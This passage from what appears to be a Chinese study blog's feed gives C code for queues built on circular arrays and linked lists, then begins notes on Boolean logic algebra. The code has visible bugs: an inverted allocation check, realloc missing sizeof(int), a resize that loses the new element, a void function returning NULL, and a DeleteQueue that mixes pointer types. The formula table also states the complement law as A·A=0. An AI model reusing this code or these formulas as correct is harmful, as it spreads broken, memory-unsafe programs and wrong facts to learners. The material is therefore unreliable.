title="操作"></a>操作</h3><ul><li>EnQueue(int data)：插入元素data到队列的队尾</li><li>int DeQueue()：删除队首元素，并返回该元素的值</li><li>int Front()：返回队首元素的值，但不删除首元素</li><li>int QueueSize()：返回队列的元素个数</li><li>int IsEmptyQueue()：判断队列是否为空</li></ul><h3 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h3><p>和栈相同，对空队列执行DeQueue会抛出空队列异常，对满队列执行EnQueue会抛出满队列异常。</p><h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><ul><li>操作系统按照到达的顺序进行作业</li><li>模拟现实中的队列问题</li><li>异步数据传输</li><li>确定超市需要的收银员人数</li><li>算法的辅助数据结构</li><li>其他数据结构的组成部分</li></ul><h2 id="队列的实现"><a href="#队列的实现" class="headerlink" title="队列的实现"></a>队列的实现</h2><p>队列的实现与栈类似，有以下三种方法：</p><ul><li>基于简单数组的实现</li><li>基于循环数组的实现</li><li>基于链表的实现</li></ul><h3 id="基于简单循环数组的实现"><a href="#基于简单循环数组的实现" class="headerlink" title="基于简单循环数组的实现"></a>基于简单循环数组的实现</h3><p>我们利用循环数组实现对队列ADT的简单实现，并用两个元素追踪队首和队尾元素。通常，用front指向队首元素，用rear指向队尾元素。</p><p>用来储存队列元素的数组可能会变满，此时EnQueue操作将抛出满队异常。同样的，对于空队列执行DeQueue操作将抛出空队异常。</p><p>初始化时，front和rear均指向-1，表示此时队列为空。</p><p>以下是实现的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span> &#123;</span></span><br><span class="line"><span class="type">int</span> front, rear;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ArrayQueue *<span class="title function_">Queue</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span>* <span class="title">Q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayQueue));</span><br><span class="line"><span class="keyword">if</span> (!Q)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果创建内存失败，返回空</span></span><br><span class="line">Q-&gt;capacity = size;<span class="comment">//初始化队列的容量</span></span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(Q-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//申请一片内存作为数组，来储存队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//假如数组申请失败，则返回空</span></span><br><span class="line"><span class="keyword">return</span> Q;<span class="comment">//返回初始化成功的队列数据对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>((Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity == Q-&gt;front);<span class="comment">//如果队尾位置后即为队首说明队满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueSize</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;capacity - Q-&gt;front + Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue Overflow!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[Q-&gt;rear] = data;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="number">-1</span>) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者为Q中不存在的元素值</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">data = Q-&gt;<span class="built_in">array</span>[Q-&gt;front];</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;<span class="comment">//对应队列中仅有一个元素的情况，删除后为空队列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q) &#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="built_in">free</span>(Q-&gt;<span class="built_in">array</span>);</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>局限性：队列的最大长度需要事先定义且不能更改，EnQueue满队时会产生满队异常。</p><h3 id="基于动态循环数组的实现"><a href="#基于动态循环数组的实现" class="headerlink" title="基于动态循环数组的实现"></a>基于动态循环数组的实现</h3><p>动态循环数组的实现和简单循环数组大致相同，唯一的区别是加入了一个ResizeQueue函数用来调整预设循环数组的大小，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span> &#123;</span></span><br><span class="line"><span class="type">int</span> front, rear;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ArrayQueue* <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span>* <span class="title">Q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayQueue));</span><br><span class="line"><span class="keyword">if</span> (!Q)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果创建内存失败，返回空</span></span><br><span class="line">Q-&gt;capacity = size;<span class="comment">//初始化队列的容量</span></span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(Q-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//申请一片内存作为数组，来储存队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//假如数组申请失败，则返回空</span></span><br><span class="line"><span class="keyword">return</span> Q;<span class="comment">//返回初始化成功的队列数据对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>((Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity == Q-&gt;front);<span class="comment">//如果队尾位置后即为队首说明队满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueSize</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;capacity - Q-&gt;front + Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullQueue(Q)) &#123;</span><br><span class="line">ResizeQueue(Q);<span class="comment">//扩大数组，调整大小</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[Q-&gt;rear] = data;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="number">-1</span>) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ResizeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> size = Q-&gt;capacity;</span><br><span class="line">Q-&gt;capacity = Q-&gt;capacity * <span class="number">2</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">realloc</span>(Q-&gt;<span class="built_in">array</span>, Q-&gt;capacity);<span class="comment">//realloc函数会自动将原内存数据复制到一片新申请的空间上</span></span><br><span class="line"><span class="keyword">if</span> (!Q-&gt;<span class="built_in">array</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Memory Error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front &gt; Q-&gt;rear) &#123;</span><br><span class="line"><span class="comment">//如果此时尾指针在首指针前，也就是队尾循环回到了队尾</span></span><br><span class="line"><span class="comment">//但是作为一维数组来看，表现为队首指针到数组起点存在元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Q-&gt;front; i++)</span><br><span class="line">&#123;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[i + size] = Q-&gt;<span class="built_in">array</span>[i];</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;rear = Q-&gt;rear + size;</span><br><span class="line"><span class="comment">//即把拓展后的循环数列“展开”，重新将尾指针移向头指针后</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者为Q中不存在的元素值</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">data = Q-&gt;<span class="built_in">array</span>[Q-&gt;front];</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;<span class="comment">//对应队列中仅有一个元素的情况，删除后为空队列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q) &#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="built_in">free</span>(Q-&gt;<span class="built_in">array</span>);</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于链表的实现-1"><a href="#基于链表的实现-1" class="headerlink" title="基于链表的实现"></a>基于链表的实现</h3><p>实现队列的另一种途径是利用链表。EnQueue操作可以通过在链表表尾插入元素实现，而DeQueue则可以通过删除链表首元素实现。</p><p>代码实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;<span class="comment">//定义了一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">front</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">rear</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Queue* <span class="title function_">CreatQueue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>* <span class="title">Q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line">Q = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Queue));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Q) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">temp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">newNode</span>;</span></span><br><span class="line">newNode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line"><span class="keyword">if</span> (!newNode)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">newNode-&gt;data = data;</span><br><span class="line">newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;rear)Q-&gt;rear-&gt;next = newNode;</span><br><span class="line">Q-&gt;rear = newNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">Q-&gt;front = Q-&gt;rear;<span class="comment">//插入时队列为空的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者队列中不存在的元素</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">temp</span>;</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line">data = Q-&gt;front-&gt;data;</span><br><span class="line">Q-&gt;front = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line"><span class="keyword">while</span> (Q-&gt;front) &#123;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line">Q = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结咯(๑′ᴗ‵๑)Ｉ Lᵒᵛᵉᵧₒᵤ❤</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/92133366_p0.png" alt="92133366_p0"></p>]]></content>
    
    
    <summary type="html">栈和队列的个人随笔</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="栈" scheme="http://example.com/tags/%E6%A0%88/"/>
    
    <category term="队列" scheme="http://example.com/tags/%E9%98%9F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>数字逻辑小结（二）——逻辑电路基础</title>
    <link href="http://example.com/2023/10/07/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%B0%8F%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/10/07/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%B0%8F%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2023-10-07T03:19:21.000Z</published>
    <updated>2023-10-17T16:13:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑电路基础"><a href="#逻辑电路基础" class="headerlink" title="逻辑电路基础"></a>逻辑电路基础</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="逻辑、二值逻辑、逻辑运算、逻辑代数"><a href="#逻辑、二值逻辑、逻辑运算、逻辑代数" class="headerlink" title="逻辑、二值逻辑、逻辑运算、逻辑代数"></a>逻辑、二值逻辑、逻辑运算、逻辑代数</h3><ol><li>逻辑：事物间的因果关系</li><li>二值逻辑：只有两种逻辑关系称为二值逻辑</li><li>逻辑运算：逻辑状态按照某种指定的因果关系进行推理运算</li><li>逻辑代数：按照一定逻辑工具进行运算的代数，是分析和设计数字电路的数学工具</li></ol><h3 id="与普通代数的区别"><a href="#与普通代数的区别" class="headerlink" title="与普通代数的区别"></a>与普通代数的区别</h3><p>普通代数可以取任何值，并运用加减乘除进行运算。</p><p>但是逻辑运算仅可取0和1，并且采用与、或、非进行运算。</p><h3 id="与、或、非"><a href="#与、或、非" class="headerlink" title="与、或、非"></a>与、或、非</h3><p>与：<em>Y&#x3D;A·B</em></p><p>或：<em>Y&#x3D;A+B</em></p><p>非：<em>Y&#x3D;A’</em></p><h2 id="复合逻辑运算"><a href="#复合逻辑运算" class="headerlink" title="复合逻辑运算"></a>复合逻辑运算</h2><p>与非，或非、</p><p>与或非：*(AB+CD)’*</p><p>异或：<em>A’B+AB’</em></p><p>同或：<em>AB+A’B’</em></p><h3 id="基本公式"><a href="#基本公式" class="headerlink" title="基本公式"></a>基本公式</h3><table><thead><tr><th></th><th>公式</th><th></th><th></th><th>公式</th></tr></thead><tbody><tr><td>1</td><td><em>0·A&#x3D;0</em></td><td>常量与变量的关系</td><td>11</td><td><em>1+A&#x3D;1</em></td></tr><tr><td>2</td><td><em>1·A&#x3D;A</em></td><td>常量与变量的关系</td><td>12</td><td><em>0+A&#x3D;A</em></td></tr><tr><td>3</td><td><em>A·A&#x3D;A</em></td><td>重叠律</td><td>13</td><td><em>A+A&#x3D;A</em></td></tr><tr><td>4</td><td><em>A·A&#x3D;0</em></td><td>互补律</td><td>14</td><td><em>A+A’&#x3D;1</em></td></tr><tr><td>5</td><td><em>A·B&#x3D;B·A</em></td><td>交换律</td><td>15</td><td><em>A+B&#x3D;B+A</em></td></tr><tr><td>6</td><td><em>A·(B·C)&#x3D;(A·B)·C</em></td><td>结合律</td><td>16</td><td><em>A+(B+C)&#x3D;(A+B)+C</em></td></tr><tr><td>7</td><td><em>A·(B+C)&#x3D;A·B+A·C</em></td><td>分配律</td><td>17</td><td>A+B·C&#x3D;(A+B)·(A+C)</td></tr><tr><td><strong>8</strong></td><td><em><strong>(A·B)’&#x3D;A’+B’</strong></em></td><td><strong>摩根定理</strong></td><td><strong>18</strong></td><td><strong>(A+B)’&#x3D;A’·B’</strong></td></tr><tr><td>9</td><td><em>(A’)’&#x3D;A</em></td><td>还原律</td><td></td><td></td></tr><tr><td>10</td><td><em>1’&#x3D;0;   0’&#x3D;1</em></td><td></td><td></td><td></td></tr></tbody></table><h3 id="常用公式"><a href="#常用公式" class="headerlink" title="常用公式"></a>常用公式</h3><p><em>A+AB&#x3D;A</em></p><p><em><strong>A+A’B&#x3D;A+B</strong></em>….②</p><p><em>AB+AB’&#x3D;A</em></p><p><em>A(A+B)&#x3D;A</em></p><p><em><strong>AB+A’C+BC&#x3D;AB+A’C</strong></em> #若两个乘积项的因子刚好互补，那么他们剩余因子构成的乘积是多余的。</p><p>关于②的推导，在*(A+B)<em>的这边乘上一个</em>(A+A’)*进行化简，有</p><p><em>(A+B)·(A+A’)&#x3D;A·A+A·A’+BA+BA’&#x3D;A+AB</em></p><h2 id="逻辑代数的基本定理"><a href="#逻辑代数的基本定理" class="headerlink" title="逻辑代数的基本定理"></a>逻辑代数的基本定理</h2><h3 id="代入规则——主要应用于公式的推广"><a href="#代入规则——主要应用于公式的推广" class="headerlink" title="代入规则——主要应用于公式的推广"></a>代入规则——主要应用于公式的推广</h3><p>在任何一个包含相同变量的逻辑等式中，如果以另外一个函数代入式中所有该变量的位置，则等式仍成立。类似于换元法，往往应用于定义的推广。</p><p>例如：摩根定理的推广</p><p><em>(A+B)’&#x3D;A’·B’  –&gt;  (A+B+C)’&#x3D;A’·(B+C)’&#x3D;A’B’C’</em></p><h3 id="反演规则——主要用于求函数的反函数"><a href="#反演规则——主要用于求函数的反函数" class="headerlink" title="反演规则——主要用于求函数的反函数"></a>反演规则——主要用于求函数的反函数</h3><ol><li>把01互换，·+互换，原变量和反变量互换</li><li>先括号，然后乘，最后加</li><li>不是单个引号上的反号要保留</li></ol><p>例如：<em>Y&#x3D;A·(B+C’)’+A’D</em></p><p>​   <em>Y’&#x3D;(A’+(B’·C’))·(A+D’)</em></p><h3 id="对偶规则——主要用于公式的推广"><a href="#对偶规则——主要用于公式的推广" class="headerlink" title="对偶规则——主要用于公式的推广"></a>对偶规则——主要用于公式的推广</h3><p>即将01互换，·+互换。</p><p>若两逻辑式相等，则他们对偶式相等。</p><h2 id="逻辑函数的表示方法"><a href="#逻辑函数的表示方法" class="headerlink" title="逻辑函数的表示方法"></a>逻辑函数的表示方法</h2><ol><li>真值表</li><li>逻辑代数式</li><li>逻辑图</li><li>波形图</li></ol><h3 id="各种表示方法的相互转化"><a href="#各种表示方法的相互转化" class="headerlink" title="各种表示方法的相互转化"></a>各种表示方法的相互转化</h3><h4 id="从真值表写逻辑函数式"><a href="#从真值表写逻辑函数式" class="headerlink" title="从真值表写逻辑函数式"></a>从真值表写逻辑函数式</h4><ul><li>找出真值表中使函数为1的那些输入变量取值的总和</li><li>每组取值组合对应一个乘积项，取值为1的写入原变量，取值为0的写入反变量</li><li>将这些乘积项相加得到目标函数</li><li>如果取值为1的情况过多，可以先求逻辑表达式的反函数，然后将取0的情况按照上述规则写出，最后由反演定理求出原函数。</li></ul><h4 id="逻辑式列真值表"><a href="#逻辑式列真值表" class="headerlink" title="逻辑式列真值表"></a>逻辑式列真值表</h4><p>将所有变量的取值组合写出然后代入计算即可</p><h4 id="逻辑式画逻辑图"><a href="#逻辑式画逻辑图" class="headerlink" title="逻辑式画逻辑图"></a>逻辑式画逻辑图</h4><p>略，好扯淡……</p><h4 id="逻辑图写逻辑函数式"><a href="#逻辑图写逻辑函数式" class="headerlink" title="逻辑图写逻辑函数式"></a>逻辑图写逻辑函数式</h4><p>这个也略……感觉不是很重要……</p><h4 id="逻辑函数式画波形图"><a href="#逻辑函数式画波形图" class="headerlink" title="逻辑函数式画波形图"></a>逻辑函数式画波形图</h4><p>对于给定的函数式，我们要遍历给出的所有变量组合，也就是要给出2^n^种情况（n为变量个数）。然后在最底部给出由函数式计算的结果并画图。</p><h4 id="由波形图写逻辑函数式"><a href="#由波形图写逻辑函数式" class="headerlink" title="由波形图写逻辑函数式"></a>由波形图写逻辑函数式</h4><p>由波形图可以得到所有变量的组合和运算值，将结果列出得到真值表，后续步骤参考真值表转化为逻辑函数式操作。</p><h2 id="逻辑函数的标准形式"><a href="#逻辑函数的标准形式" class="headerlink" title="逻辑函数的标准形式"></a>逻辑函数的标准形式</h2><h3 id="最小项和最大项"><a href="#最小项和最大项" class="headerlink" title="最小项和最大项"></a>最小项和最大项</h3><h4 id="最小项的定义"><a href="#最小项的定义" class="headerlink" title="最小项的定义"></a>最小项的定义</h4><p>在n变量逻辑函数中，若m为包含n个因子的乘积项，而这n个变量在乘积项中均以原变量或者反变量的形式出现且仅出现一次，那么m称作该组变量的<strong>最小项</strong></p><p>如给定变量<em>A、B、C</em>，乘积项*ABC’*是一个最小项</p><p>比如<em>F(A,B)&#x3D;AB+A’B+AB’+A’B’&#x3D;m<del>3</del>+m<del>1</del>+m<del>2</del>+m<del>0</del>&#x3D;∑m<del>i</del>(i&#x3D;0~3)</em></p><h4 id="最小项的编号表示方法"><a href="#最小项的编号表示方法" class="headerlink" 